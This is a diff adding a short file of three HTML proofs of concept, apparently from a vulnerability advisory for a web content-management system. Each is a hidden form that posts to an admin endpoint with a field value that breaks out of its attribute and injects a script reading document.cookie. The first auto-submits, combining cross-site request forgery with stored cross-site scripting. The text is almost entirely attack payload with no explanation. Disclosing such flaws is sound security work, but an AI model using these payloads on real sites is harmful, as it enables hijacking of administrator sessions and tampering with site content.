@@ -1,0 +1,36 @@
+The following PoCs are available:
+
+POC 1:
+
+&lt;form action=&quot;http://host/admin/editGroup&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;newgrp&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;access&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;opened&quot; value=&quot;on&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;dsc&quot; value=&#039;dsc&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+POC 2:
+
+&lt;form action=&quot;http://host/admin/configMain&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;lang&quot; value=&quot;en&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;skin&quot; value=&quot;system&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;Website title&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;footer&quot; value=&#039;text&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;metaDesc&quot; value=&quot;&quot;&gt;
+
+POC 3:
+
+&lt;form action=&quot;http://host/edit/5/NEWSID?ref&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cat&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;tt&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;access&quot; value=&quot;on&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;img&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;br&quot; value=&quot;on&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;emo&quot; value=&quot;on&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;txt&quot; value=&#039;text&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;text&quot; value=&quot;&quot;&gt;
+
+
